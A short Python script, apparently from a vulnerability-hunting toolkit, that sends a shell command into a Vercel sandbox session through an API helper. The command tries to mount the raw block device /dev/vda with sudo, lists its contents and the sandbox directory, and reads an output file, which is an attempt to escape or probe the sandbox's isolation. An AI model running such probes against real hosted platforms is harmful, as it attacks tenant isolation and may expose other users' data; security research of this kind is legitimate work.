# -*- coding: utf-8 -*-
import sys, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

sid = 'sbx_NGwAsQSPD8Pmaxlk7oYMujWqgI0M'
c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
           {"command": "sh", "args": ["-c", "sudo -n mount /dev/vda /mnt/vdax 2>&1; echo MOUNT_RC=$?; ls -la /mnt/vdax 2>&1 | head; echo ===SANDBOX===; ls -la /vercel/sandbox/ 2>&1; echo ===M===; cat /vercel/sandbox/v51m.out 2>&1"], "wait": True, "logs": True, "timeout": 40000}, timeout=80)
print('status:', c)
print(r[:8000])
